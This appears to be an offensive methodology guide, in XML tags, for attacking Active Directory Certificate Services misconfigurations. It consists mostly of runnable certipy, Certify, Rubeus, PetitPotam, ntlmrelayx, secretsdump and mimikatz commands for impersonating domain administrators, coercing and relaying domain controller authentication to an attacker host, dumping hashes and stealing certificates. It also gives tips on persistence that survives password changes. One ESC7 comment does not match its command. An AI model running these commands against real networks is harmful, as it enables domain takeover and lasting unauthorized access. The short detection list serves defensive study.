<vulnerability_guide>
  <title>ACTIVE DIRECTORY CERTIFICATE SERVICES (AD CS) ATTACKS</title>

  <critical>AD CS misconfigurations (ESC1-ESC11) allow attackers to obtain certificates that can be used for authentication as any user, including Domain Admins. These attacks are particularly dangerous because certificates persist even after password changes and can provide long-term persistent access. AD CS vulnerabilities are among the most impactful findings in Active Directory environments.</critical>

  <scope>
    - Certificate template misconfigurations (ESC1-ESC4)
    - PKI infrastructure vulnerabilities (ESC5-ESC8)
    - Certificate theft and forgery (ESC9-ESC11)
    - NTLM relay to certificate enrollment
    - Machine certificate abuse
    - Cross-forest certificate attacks
  </scope>

  <methodology>
    1. **Enumerate CA infrastructure**: Identify Certificate Authorities and templates
    2. **Find vulnerable templates**: Check for misconfigured enrollment permissions
    3. **Identify attack path**: Determine exploitable ESC vulnerability
    4. **Obtain certificate**: Request certificate for privileged user
    5. **Authenticate**: Use certificate for Kerberos/NTLM authentication
  </methodology>

  <advanced_techniques>
    <ca_enumeration>
      Discover AD CS infrastructure:
      {% raw %}
      # Certipy - comprehensive enumeration
      certipy find -u user@domain.local -p pass -dc-ip DC_IP
      certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable

      # Certify.exe - Windows enumeration
      Certify.exe find
      Certify.exe find /vulnerable
      Certify.exe find /enrolleeSuppliesSubject

      # LDAP enumeration
      ldapsearch -x -H ldap://DC_IP -b "CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)"

      # PowerShell
      Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter *
      {% endraw %}
    </ca_enumeration>

    <esc1_template_allows_san>
      ESC1 - Template allows requester to specify Subject Alternative Name:
      {% raw %}
      # Identify vulnerable template
      certipy find -vulnerable -stdout | grep -A 20 "ESC1"
      Certify.exe find /enrolleeSuppliesSubject

      # Request certificate as Domain Admin
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'VulnerableTemplate' -upn administrator@domain.local

      # Certify.exe
      Certify.exe request /ca:dc.domain.local\CA-NAME /template:VulnerableTemplate /altname:administrator

      # Authenticate with certificate
      certipy auth -pfx administrator.pfx -dc-ip DC_IP
      # Returns NTLM hash

      # Rubeus - authenticate with certificate
      Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /ptt
      {% endraw %}
    </esc1_template_allows_san>

    <esc2_any_purpose_template>
      ESC2 - Template allows Any Purpose EKU or no EKU:
      {% raw %}
      # Find Any Purpose templates
      certipy find -vulnerable -stdout | grep -A 20 "ESC2"
      Certify.exe find /vulnerable

      # Request certificate
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'AnyPurposeTemplate'

      # Use for client authentication
      certipy auth -pfx user.pfx

      # SubCA certificate can sign other certificates
      # Can be used to create certificates for any user
      {% endraw %}
    </esc2_any_purpose_template>

    <esc3_enrollment_agent>
      ESC3 - Template allows enrollment agent to request on behalf of others:
      {% raw %}
      # Find enrollment agent templates
      certipy find -vulnerable -stdout | grep -A 20 "ESC3"

      # Step 1: Get enrollment agent certificate
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'EnrollmentAgentTemplate'

      # Step 2: Use agent cert to request cert on behalf of admin
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -on-behalf-of 'domain\administrator' -pfx enrollment_agent.pfx

      # Certify.exe
      Certify.exe request /ca:CA /template:User /onbehalfof:domain\administrator /enrollcert:agent.pfx
      {% endraw %}
    </esc3_enrollment_agent>

    <esc4_template_acl>
      ESC4 - Vulnerable template ACL allows modification:
      {% raw %}
      # Find templates with weak ACLs
      certipy find -vulnerable -stdout | grep -A 20 "ESC4"

      # Modify template to enable ESC1
      # Add ENROLLEE_SUPPLIES_SUBJECT flag
      certipy template -u user@domain.local -p pass -template 'TargetTemplate' -save-old

      # StandIn.exe
      StandIn.exe --adcs --filter TargetTemplate --ess

      # PowerShell - modify template
      Set-ADObject "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace @{'msPKI-Certificate-Name-Flag'=1}

      # Now exploit as ESC1
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'TargetTemplate' -upn administrator@domain.local
      {% endraw %}
    </esc4_template_acl>

    <esc6_editf_attributesubjectaltname2>
      ESC6 - CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled:
      {% raw %}
      # Check CA configuration
      certipy find -vulnerable -stdout | grep -A 20 "ESC6"
      certutil -config "CA\CA-NAME" -getreg policy\EditFlags

      # Request any template with SAN
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -upn administrator@domain.local

      # Certify.exe
      Certify.exe request /ca:CA /template:User /altname:administrator
      {% endraw %}
    </esc6_editf_attributesubjectaltname2>

    <esc7_ca_acl>
      ESC7 - Vulnerable CA ACL allows ManageCA/ManageCertificates:
      {% raw %}
      # Find CAs with weak ACLs
      certipy find -vulnerable -stdout | grep -A 20 "ESC7"

      # Add ManageCA to enable ESC6
      certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -add-officer user

      # Enable EDITF_ATTRIBUTESUBJECTALTNAME2
      certipy ca -u user@domain.local -p pass -ca 'CA-NAME' -enable-template 'SubCA'

      # Now exploit as ESC6
      certipy req -u user@domain.local -p pass -ca 'CA-NAME' -template 'User' -upn administrator@domain.local
      {% endraw %}
    </esc7_ca_acl>

    <esc8_ntlm_relay>
      ESC8 - NTLM relay to AD CS HTTP endpoint:
      {% raw %}
      # Identify Web Enrollment endpoint
      certipy find -vulnerable -stdout | grep -A 20 "ESC8"
      curl -I http://ca.domain.local/certsrv/

      # Set up relay
      ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController

      # Coerce DC authentication
      PetitPotam.py attacker_ip dc.domain.local

      # Relay provides certificate for DC machine account
      # Authenticate with DC certificate
      certipy auth -pfx dc.pfx -dc-ip DC_IP

      # DCSync with machine account hash
      secretsdump.py -hashes :HASH domain/DC\$@dc.domain.local
      {% endraw %}
    </esc8_ntlm_relay>

    <esc9_no_security_extension>
      ESC9 - Certificate without security extension can impersonate:
      {% raw %}
      # Check for templates without security extension
      certipy find -vulnerable -stdout | grep -A 20 "ESC9"

      # Shadow Credentials + certificate abuse
      # Requires GenericWrite on target user

      certipy shadow auto -u user@domain.local -p pass -account target
      {% endraw %}
    </esc9_no_security_extension>

    <certificate_theft>
      Steal existing certificates:
      {% raw %}
      # Export from Windows cert store
      Certify.exe find /clientauth
      mimikatz # crypto::certificates /export

      # Find certificates in files
      dir /s *.pfx *.p12 *.pem *.cer

      # DPAPI-protected certificates
      SharpDPAPI.exe certificates /machine

      # certipy - export from AD
      certipy find -u user@domain.local -p pass -dc-ip DC_IP -old-bloodhound
      {% endraw %}
    </certificate_theft>
  </advanced_techniques>

  <validation>
    - Successfully enumerate CA and certificate templates
    - Identify at least one exploitable ESC vulnerability
    - Obtain certificate allowing authentication as privileged user
    - Successfully authenticate using obtained certificate
    - Demonstrate persistence capability (certificate valid after password change)
  </validation>

  <false_positives>
    - Template requires manager approval
    - Template requires authorized signatures
    - CA is offline or unreachable
    - Certificate enrollment quota exceeded
    - User not enrolled in template ACL
  </false_positives>

  <detection_indicators>
    - Event ID 4886 (Certificate Services received certificate request)
    - Event ID 4887 (Certificate Services approved certificate request)
    - Certificate requests with SAN different from requester
    - Machine certificate requests from non-machine principals
    - High volume of certificate requests from single user
    - Unusual certificate template usage patterns
  </detection_indicators>

  <pro_tips>
    - ESC8 + PetitPotam = Domain compromise from any domain user
    - Certificates survive password changes (persistent access)
    - Check for vulnerable templates in all domains in forest
    - Machine templates can be abused for RBCD attacks
    - ESC1 is most common and easiest to exploit
    - ESC4 can convert any template to ESC1
    - Web Enrollment (certsrv) is often enabled and vulnerable to relay
    - Certificate-based auth bypasses many detection mechanisms
    - Golden Certificate = forge certs for any user using CA private key
  </pro_tips>

  <remember>AD CS misconfigurations can provide complete domain compromise from a standard user account and persistent access that survives credential rotation. Always check for ESC1 and ESC8 as they are the most common and impactful.</remember>
</vulnerability_guide>
